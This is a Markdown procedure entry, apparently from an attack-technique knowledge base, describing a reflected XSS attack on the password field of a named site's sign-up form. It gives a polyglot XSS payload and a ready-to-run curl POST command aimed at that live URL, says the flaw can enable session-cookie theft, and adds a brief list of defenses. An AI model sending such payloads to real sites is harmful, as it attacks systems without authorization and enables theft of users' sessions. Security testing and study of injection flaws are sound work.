---
id: proc-uuid-submit-xss
tags:
  - xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-submit-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.092Z'
skill_level: beginner
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit-XSS-Payload-to-Password-Field

## Summary

This procedure submits a polyglot XSS payload into the password parameter of the Localize sign-up form via POST request, exploiting insufficient sanitization to reflect and execute JavaScript.

## Description

The Localize sign-up page at http://www.localize.io/pages/sign_up reflects user input from the password field without proper escaping, allowing attackers to inject JavaScript. A polyglot payload is used to bypass common filters, leading to execution of code like alert(1) upon reflection. This can enable stealing session cookies or performing other client-side attacks in the victim's browser during registration.

## Requirements

1. Access to the sign-up page
2. Tool for sending HTTP POST requests (e.g., curl or browser)
3. Knowledge of form parameters (password, email, etc.)

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs, especially in password fields, using HTML entity encoding
- Implement Content Security Policy (CSP) to restrict script execution
- Log and monitor anomalous payloads in form submissions

## Objectives

1. Inject arbitrary JavaScript via the password parameter
2. Achieve reflection without server-side blocking
3. Set up for client-side execution and impact demonstration

## Instructions

### Step 1: Prepare Payload

**Context**: Craft a polyglot XSS payload resilient to various filters.

Use the following payload: `/*-->\\]\]>%>?></object></script></title></textarea></noscript></style></xmp>'-/\"/-alert(1)//><img src=1 onerror=alert(1)>`

> This payload breaks out of common contexts and triggers an alert for testing.

### Step 2: Submit via POST

**Context**: Send the payload using a POST request to the endpoint.

**Command** ([[commands/curl-submit-xss-payload]]):
```bash
curl -X POST http://www.localize.io/pages/sign_up \
  -d "password=/*-->\\]\]>%>?></object></script></title></textarea></noscript></style></xmp>'-/\"/-alert(1)//><img src=1 onerror=alert(1)>" \
  -d "email=test@example.com" \
  --data-urlencode "other_field=value"
```

> The request submits the payload; check the response for reflection. Success if the payload appears unescaped in HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-submit-xss-payload]]

## Tools Used


## Tags

- xss
- payload-injection
